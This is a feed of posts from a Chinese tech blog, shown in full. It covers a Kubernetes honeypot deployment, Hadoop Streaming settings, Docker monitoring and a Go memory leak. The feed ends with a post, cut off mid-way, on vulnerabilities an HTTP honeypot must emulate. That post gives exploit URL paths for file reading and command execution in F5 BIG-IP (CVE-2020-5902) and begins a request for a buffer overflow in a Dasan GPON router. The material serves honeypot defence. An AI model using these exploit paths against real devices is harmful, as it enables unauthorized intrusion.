ConfigMap。在国内和国外我们创建了两个 Deployment。每个 pod 包含两个容器，分别是我们的蜜罐和 cowrie。</p><ul><li>升级策略：<code>spec.strategy</code> 使用了 Recreate，即在升级时一次性删除所有旧版本的pod后再创建新pod</li><li>节点选择器：<code>spec.template.spec.nodeSelector</code> 选择之前设置的 type 标签选择 worker 节点。根据不同的地址位置选择 loc 标签</li><li>非亲缘性：<code>spec.template.spec.affinity</code> 定义 podAntiAffinity 强制 pod 调度到不同的节点上。</li><li>赋值 ServiceAccount：<code>spec.template.spec.serviceAccountName</code></li><li>使用宿主节点的网络空间：<code>spec.template.spec.hostNetwork</code></li><li>使用特权模式运行pod：<code>spec.template.spec.containers.securityContext</code></li><li>挂载配置文件：<code>spec.template.spec.containers.volumeMounts</code></li><li>存活指针：<code>spec.template.spec.containers.livenessProbe</code></li></ul><p>完整的配置文件放在了最后。</p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><ul><li>在部署工作节点时，如果节点的公网 IP 没有绑定到网卡上，需要在 Master 上设置 iptables 规则，将内网 IP 转向外网 IP。<a href="https://www.jianshu.com/p/897e0f14be60">参考</a></li><li>当前的集群配置比较初级，后续还有很大的改进空间。</li><li>《Kubernetes in Action》真的很不错。</li></ul><h3 id="honeypot-deployment-cn-yaml"><a href="#honeypot-deployment-cn-yaml" class="headerlink" title="honeypot-deployment-cn.yaml"></a>honeypot-deployment-cn.yaml</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">honeypot-cn</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">strategy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">Recreate</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">&quot;worker&quot;</span></span><br><span class="line">        <span class="attr">loc:</span> <span class="string">&quot;cn&quot;</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">podAntiAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">topologyKey:</span> <span class="string">kubernetes.io/hostname</span></span><br><span class="line">            <span class="attr">labelSelector:</span></span><br><span class="line">              <span class="attr">matchLabels:</span></span><br><span class="line">                <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">sa</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">xxxxx/xxxxxx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">honeypot-config</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/config/</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">tcpSocket:</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">20</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">600</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">cowrie/cowrie</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">cowrie</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/cowrie/cowrie-git/etc</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">tcpSocket:</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">20</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">honeypot-config</span></span><br><span class="line">        <span class="attr">secret:</span></span><br><span class="line">          <span class="attr">secretName:</span> <span class="string">honeypot-config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line">        <span class="attr">configMap:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;搭建集群&quot;&gt;&lt;a href=&quot;#搭建集群&quot; class=&quot;headerlink&quot; title=&quot;搭建集群&quot;&gt;&lt;/a&gt;搭建集群&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hadoop Sreaming Note</title>
    <link href="http://woodpile27.cn/2020/10/06/hadoop-steaming-note/"/>
    <id>http://woodpile27.cn/2020/10/06/hadoop-steaming-note/</id>
    <published>2020-10-06T00:00:00.000Z</published>
    <updated>2020-10-16T04:34:32.169Z</updated>
    
    <content type="html"><![CDATA[<h3 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h3><ul><li><strong>mapreduce.job.name</strong>：job name。</li><li><strong>mapreduce.job.priority</strong>：优先级调度，只是在计算任务向集群服务申请资源的时候会起作用。</li><li><strong>mapreduce.job.running.map.limit</strong>：每个作业最多可以同时跑多少个map，默认是0，当值为0或负数时无限制。</li><li><strong>mapreduce.job.reduces</strong>：reduce任务个数，默认是1。</li><li><strong>mapred.input.dir.error.pass</strong>：跳过输入路径错误。</li><li><strong>mapred.split.zero.file.skip</strong>：如果文件长度为0则划分split。</li></ul><h4 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h4><ul><li><strong>mapreduce.map.maxattempts</strong>：每个map任务最大重试次数，重试次数超过该值则认为任务运行失败。默认是4。</li><li><strong>mapreduce.reduce.maxattempts</strong>：每个reduce任务最大重试次数，同上。  </li><li><strong>mapreduce.task.timeout</strong>：Task超时时间。如果一个任务在一定时间内不读取新的数据，也没有输出数据，则认为其处于block状态。为了防止用户程序永远block住不退出，强制设置了一个超时时间（单位毫秒），默认是300000。</li></ul><h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><ul><li><strong>mapreduce.map.output.compress</strong>：在通过网络发送之前map的输出是否压缩。默认false。</li><li><strong>mapreduce.map.output.compress.codec</strong>：指定map输出所用的压缩codec。</li></ul><p>对map输出进行数据压缩可以加速网络传输，对reduce输出进行数据压缩可以减少磁盘空间，如果输入文件是压缩的,那么在根据文件扩展名推断出相应的codec后，MapReduce会在读取文件是自动解压缩文件。</p><h4 id="效率和稳定性"><a href="#效率和稳定性" class="headerlink" title="效率和稳定性"></a>效率和稳定性</h4><ul><li><strong>mapreduce.map.speculative</strong>：map开启推测执行。默认true。</li><li><strong>mapreduce.reduce.speculative</strong>：reduce开启推测执行。默认true。</li></ul><p>在作业执行时，由于一些原因，比如硬件老化、软件层面的不恰当配置等。某些机器上的任务实例执行的很慢，拖慢了整个作业的进度。Hadoop不会尝试去诊断或者修复这些慢任务，相反它会在集群的其他节点上去启动这些慢任务的多个示例作为备份，这就是hadoop的推测执行（speculative execution）。</p><h3 id="map数量如何确定"><a href="#map数量如何确定" class="headerlink" title="map数量如何确定"></a>map数量如何确定</h3><p>map的个数等于split的个数。<br>其由三个因素决定：</p><ol><li>输入文件数目</li><li>输入文件大小</li><li>配置参数</li></ol><p>一般来说，对于每一个输入的文件会有一个map split。如果输入文件太大，会把大文件划分成多个split进行处理，每个map处理一个split。<br>涉及的参数：</p><ul><li><strong>mapreduce.input.fileinputformat.split.minsize</strong>：启动map最小的split size大小，默认0</li><li><strong>mapreduce.input.fileinputformat.split.maxsize</strong>：启动map最大的split size大小，默认256M</li><li><strong>dfs.block.size</strong>：block块大小。</li></ul><p>计算公式：<strong>splitSize =  Math.max(minSize, Math.min(maxSize, blockSize))</strong></p><p>FileInputFormat class 的getSplits()的伪代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num_splits &#x3D; 0</span><br><span class="line">for each input file f:</span><br><span class="line">    remaining &#x3D; f.length</span><br><span class="line">    while remaining &#x2F; split_size &gt; split_slope:</span><br><span class="line">        num_splits +&#x3D; 1</span><br><span class="line">        remaining -&#x3D; split_size</span><br><span class="line">    where:</span><br><span class="line">        split_slope &#x3D; 1.1 分割斜率</span><br><span class="line">        split_size &#x3D;~ dfs.blocksize 分割大小约等于hdfs块大小</span><br></pre></td></tr></table></figure><p>会有一个比例进行运算来进行切片，为了减少资源的浪费<br>例如一个文件大小为260M，在进行MapReduce运算时，会首先使用260M/128M(blocksize)，得出的结果和1.1进行比较，大于则切分出一个128M作为一个分片，剩余132M，再次除以128(blocksize)，得到结果为1.03，小于1.1则将132作为一个切片，即最终260M被切分为两个切片进行处理，而非3个切片。  </p><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><h4 id="sys-argv"><a href="#sys-argv" class="headerlink" title="sys.argv"></a>sys.argv</h4><p>mapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arg1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">arg2 = sys.argv[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>hadoop straming：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -mapper <span class="string">&quot;mapper.py arg1 arg2&quot;</span> \</span><br><span class="line">    -file <span class="string">&quot;mapper.py&quot;</span></span><br></pre></td></tr></table></figure><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>mapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"></span><br><span class="line">date_start = os.environ.get(<span class="string">&quot;date_start&quot;</span>)</span><br></pre></td></tr></table></figure><p>hadoop straming：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -mapper <span class="string">&quot;mapper.py&quot;</span> \</span><br><span class="line">    -cmdenv <span class="string">&quot;date_start=<span class="variable">$date</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="设置多个输入目录"><a href="#设置多个输入目录" class="headerlink" title="设置多个输入目录"></a>设置多个输入目录</h3><h4 id="使用多个-input选项-or-逗号分割"><a href="#使用多个-input选项-or-逗号分割" class="headerlink" title="使用多个-input选项 or 逗号分割"></a>使用多个-input选项 or 逗号分割</h4><p>多个 -input：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir1&quot;</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir2&quot;</span></span><br></pre></td></tr></table></figure><p>逗号分割：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir1,/user/foo/dir2&quot;</span></span><br></pre></td></tr></table></figure><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir[1-2]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/&#123;dir1,dir2&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input_file=(<span class="string">&quot;/user/foo/dir1&quot;</span> <span class="string">&quot;/user/foo/dir2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="variable">$&#123;input_file[@]&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;配置参数&quot;&gt;&lt;a href=&quot;#配置参数&quot; class=&quot;headerlink&quot; title=&quot;配置参数&quot;&gt;&lt;/a&gt;配置参数&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;mapreduce.job.name&lt;/strong&gt;：job name。&lt;/li&gt;
&lt;li&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cadvisor+Prometheus+Grafana监控docker</title>
    <link href="http://woodpile27.cn/2020/09/16/docker-monitor/"/>
    <id>http://woodpile27.cn/2020/09/16/docker-monitor/</id>
    <published>2020-09-16T00:00:00.000Z</published>
    <updated>2020-09-16T04:10:37.214Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下使用Cadvisor+Prometheus+Grafana监控docker的搭建过程。<br>全部使用docker容器搭建，效果还不错。</p><h3 id="Cadvisor"><a href="#Cadvisor" class="headerlink" title="Cadvisor"></a>Cadvisor</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run    \                                      </span><br><span class="line">    --volume&#x3D;&#x2F;:&#x2F;rootfs:ro    \             </span><br><span class="line">    --volume&#x3D;&#x2F;var&#x2F;run:&#x2F;var&#x2F;run:rw    \                </span><br><span class="line">    --volume&#x3D;&#x2F;sys:&#x2F;sys:ro    \                         </span><br><span class="line">    --volume&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;:&#x2F;var&#x2F;lib&#x2F;docker:ro    \  </span><br><span class="line">    --publish&#x3D;8080:8080    \                          </span><br><span class="line">    --detach&#x3D;true    \                                </span><br><span class="line">    --name&#x3D;cadvisor    \                               </span><br><span class="line">    google&#x2F;cadvisor:latest</span><br></pre></td></tr></table></figure><h3 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h3><p>编辑/etc/prometheus/prometheus.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">global:</span><br><span class="line">  scrape_interval:     15s</span><br><span class="line">  evaluation_interval: 15s</span><br><span class="line"></span><br><span class="line">scrape_configs:</span><br><span class="line">  - job_name: &#39;docker&#39;</span><br><span class="line">    static_configs: </span><br><span class="line">    - targets: [&#39;192.168.1.152:8080&#39;]</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run    \ </span><br><span class="line">    -p 9090:9090 -d    \ </span><br><span class="line">    -v &#x2F;etc&#x2F;prometheus&#x2F;prometheus.yml:&#x2F;etc&#x2F;prometheus&#x2F;prometheus.yml    \ </span><br><span class="line">    --name prometheus    \  </span><br><span class="line">    prom&#x2F;prometheus</span><br></pre></td></tr></table></figure><p>启动后访问<code>http://ip:9090</code>Status中的Targets，确保job处于up状态。</p><h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run    \</span><br><span class="line">    --name grafana    \</span><br><span class="line">    -d -p 3000:3000    \ </span><br><span class="line">    grafana&#x2F;grafana</span><br></pre></td></tr></table></figure><p>启动后访问<code>http://ip:3000</code></p><ul><li>添加Data Sources：选择Prometheus， URL配置为<code>http://192.168.1.152:9090</code></li><li>导入dashboard：选择模板<code>https://grafana.com/dashboards/193</code>或<code>https://grafana.com/grafana/dashboards/10566</code>。import后可看到效果。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一下使用Cadvisor+Prometheus+Grafana监控docker的搭建过程。&lt;br&gt;全部使用docker容器搭建，效果还不错。&lt;/p&gt;
&lt;h3 id=&quot;Cadvisor&quot;&gt;&lt;a href=&quot;#Cadvisor&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Go应用内存泄漏问题的解决</title>
    <link href="http://woodpile27.cn/2020/09/15/go-memory-leak/"/>
    <id>http://woodpile27.cn/2020/09/15/go-memory-leak/</id>
    <published>2020-09-15T00:00:00.000Z</published>
    <updated>2020-09-15T10:24:31.748Z</updated>
    
    <content type="html"><![CDATA[<p>部署的一个Go语言写的程序出现内存占用逐渐上升的情况，排查了一段时间终于找到了原因。</p><h3 id="pprof"><a href="#pprof" class="headerlink" title="pprof"></a>pprof</h3><p>当出现内存占用不断上升的情况时，首先考虑是不是出现了内存泄露的问题。于是用pprof对程序进行持续的监控，从结果来看，goroutine的数量一直在一个稳定的范围内，排除goroutine泄漏的情况。<br>接着讲目光转移到inuse_space，然后看到了让我当时很疑惑的结果：<br><strong>pprof的结果与实际的内存占用结果出现了很大的差异</strong> ，pprof看到的内存占用只有个位数的MB，而无论是docker占用的内存亦或是在容器里top看到的内存占用都达到了上百兆。</p><p>在一番google之下找到了原因：<br>pprof看到的内存占用，其实只是golang逻辑上正在使用的内存量，不包括已被GC回收但尚未返还给操作系统的内存，同样也不包含内核态的内存占用，而top是站在操作系统层面看到的进程内存占用，理论上就是会比pprof看到的内存占用量更多。如果在工作中发现top看到占用的内存很大，而pprof看到的内存占用不多，有可能是两个问题导致的：</p><ul><li>有大量内存被GC但还没有来得及返还给操作系统</li><li>某些内核态操作（比如I/O）消耗了大量内存</li></ul><h3 id="byte导致的问题？"><a href="#byte导致的问题？" class="headerlink" title="[]byte导致的问题？"></a>[]byte导致的问题？</h3><p>我的程序在运行中会频繁的创建大量的[]byte，并且[]byte的长度也不小。而用pprof发现这部分代码占用的内存确实较多，猜测是不是这部分占用的内存被GC后没有及时反还给操作系统。<br>stackoverflow上有这样一个<a href="https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer">问题</a>：无法释放由bytes.Buffer占用的内存。高赞回答：</p><blockquote><p>Go是一种垃圾回收语言，这意味着当这些变量变得不可访问时，垃圾回收器会自动释放变量分配和使用的内存。释放的内存并不意味着将其返回给操作系统，释放的内存意味着可以回收该内存，并在需要时将其重新用于另一个变量。因此在操作系统中，不会仅由于某些变量变得不可访问而垃圾回收器检测到此变量并释放它所使用的内存就立刻看到内存减少。</p><p>但是如果Go运行一段时间（通常为5分钟）不使用，它将把内存返回给OS。如果在此期间内存使用量增加，则很有可能不会将内存返回给操作系统。如果等待一段时间而不重新分配内存，则释放的内存最终将返回给操作系统（不是所有内存，而是未使用的“大块”内存）。如果想迫不及待发生这种情况，可以调用debug.FreeOSMemory()强制执行。</p></blockquote><p>这篇<a href="https://blog.cloudflare.com/recycling-memory-buffers-in-go/">文章</a>同样指出了类似的问题，但是通过运行作者的示例程序发现HeapReleased也即回收到操作系统的内存，并非像作者描述的不会经常变化，相反其变化的非常快，也就是Go在不断在操作系统中回收内存。<br>原因应该是这两篇文章都已经年代久远，Go的更新迭代已经解决了上述问题。</p><h3 id="go-python"><a href="#go-python" class="headerlink" title="go-python"></a>go-python</h3><p>之后我又将目光转向go-python，程序中会不断通过go-python调用一个python脚本，而go-python是通过cgo调用libpython实现的。<br>问题是否出在这儿呢？首先我进行了验证，即注释掉了相关代码并且使CGO_ENABLED=0，测试结果发现程序没有出现之前的内存泄漏情况，于是终于找到了问题所在。<br>在go-python项目中有一个 <strong>memory leak</strong> 的issue吸引了我的注意：</p><blockquote><p>When to call GC？Do users need manual GC?</p></blockquote><blockquote><p>go-python is calling the CPython API through Cgo.<br>so you have to program as in C and follow the reference counting of the CPython API (calling python.Object.IncRef() and python.Object.DecRef().)</p><p>there’s no GC involved.<br><strong>you need to manually manage memory.</strong></p></blockquote><p>问题在于使用者需要手动管理内存，PyObject对象使用结束后需要主动调用 <strong>DecRef</strong> ，通过减少引用计数的方式释放，否则就会发生内存泄漏的情况。实测 <strong>DecRef</strong> 可能会引发某些问题，可以根据go-python文档的推荐改用 <strong>Clear</strong> 。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://segmentfault.com/a/1190000016412013">https://segmentfault.com/a/1190000016412013</a><br><a href="https://segmentfault.com/a/1190000019929993">https://segmentfault.com/a/1190000019929993</a><br><a href="https://github.com/wolfogre/go-pprof-practice/issues/1">https://github.com/wolfogre/go-pprof-practice/issues/1</a><br><a href="https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer/37383604#37383604">https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer/37383604#37383604</a><br><a href="https://stackoverflow.com/questions/45509538/freeing-unused-memory">https://stackoverflow.com/questions/45509538/freeing-unused-memory</a><br><a href="https://blog.cloudflare.com/recycling-memory-buffers-in-go/">https://blog.cloudflare.com/recycling-memory-buffers-in-go/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;部署的一个Go语言写的程序出现内存占用逐渐上升的情况，排查了一段时间终于找到了原因。&lt;/p&gt;
&lt;h3 id=&quot;pprof&quot;&gt;&lt;a href=&quot;#pprof&quot; class=&quot;headerlink&quot; title=&quot;pprof&quot;&gt;&lt;/a&gt;pprof&lt;/h3&gt;&lt;p&gt;当出现内存占用不</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HTTP蜜罐中需要模拟响应的漏洞&amp;服务</title>
    <link href="http://woodpile27.cn/2020/08/19/http-honeypot/"/>
    <id>http://woodpile27.cn/2020/08/19/http-honeypot/</id>
    <published>2020-08-19T11:37:10.000Z</published>
    <updated>2020-08-19T11:42:27.160Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution"><a href="#CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution" class="headerlink" title="CVE-2020-5902  - F5 BIG-IP Remote Code Execution"></a>CVE-2020-5902  - F5 BIG-IP Remote Code Execution</h3><h4 id="description"><a href="#description" class="headerlink" title="description"></a>description</h4><p>在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。<br>任意文件读取</p><ul><li><code>https://IP:8443/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=</code></li></ul><p>远程命令执行</p><ul><li><code>https://&#123;0&#125;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=</code></li></ul><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/zhzyker/exphub/tree/master/f5">https://github.com/zhzyker/exphub/tree/master/f5</a><br><a href="https://github.com/dunderhay/CVE-2020-5902/blob/master/CVE-2020-5902.py">https://github.com/dunderhay/CVE-2020-5902/blob/master/CVE-2020-5902.py</a></p><h3 id="Dasan-Networks-GPON-ONT-WiFi-Router-H640X-12-02-01121-2-77p1-1124-3-03p2-1146-Remote-Code-Execution"><a href="#Dasan-Networks-GPON-ONT-WiFi-Router-H640X-12-02-01121-2-77p1-1124-3-03p2-1146-Remote-Code-Execution" class="headerlink" title="Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution"></a>Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution</h3><h4 id="description-1"><a href="#description-1" class="headerlink" title="description"></a>description</h4><p>Dasan GPON ONT WiFi Router是韩国DASAN Networks公司的一款无线路由器设备。Dasan GPON ONT WiFi Router H640X 12.02-0112版本、2.77p1-1124版本和3.03p2-1146版本中存在缓冲区溢出漏洞。攻击者可通过向 <strong>/cgi-bin/login_action.cgi</strong> 文件中的‘login_action’函数发送较长的POST请求利用该漏洞执行任意代码。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/login_action.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.100:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: https://192.168.1.100:8080/cgi-bin/login.cgi</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 868</span><br><span class="line"></span><br><span 